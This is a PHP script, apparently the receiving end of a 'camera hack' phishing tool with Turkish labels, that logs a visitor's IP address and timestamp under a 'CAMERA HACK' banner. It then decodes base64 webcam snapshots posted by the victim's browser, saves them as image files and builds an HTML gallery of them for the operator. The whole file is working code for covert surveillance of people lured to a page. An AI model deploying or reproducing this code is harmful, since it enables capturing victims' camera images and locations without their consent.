<?php
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r";
    }

$save = fopen("_command","w");
date_default_timezone_set('Europe/Istanbul');
$tarih = date('d/m/Y H:i:s');
$command = ("camera-hack
+-+-+ CAMERA HACK +-+-+

 Tarih         : ".$tarih."

 İp Adresi     : ".$ipaddress."

    | RESİMLER ALINIYOR.. |

+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
");
fwrite($save,$command);
fclose($save);

$date = date('dMYHis');
$imageData=$_POST['cat'];

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'images/cam'.$date.'.png', 'wb' );
$save = fopen("saved_info.txt","a+");
$total = fopen("total","a+");
$saved_total = ("total\n");
$saved_info = ("
<img src='images/cam$date.png' width='500' height='500'><br><br>\n");
fwrite($save,$saved_info);
fwrite($total,$saved_total);
fwrite( $fp, $unencodedData);
fclose( $fp );
fclose($save);
fclose($total);
exit();
?>

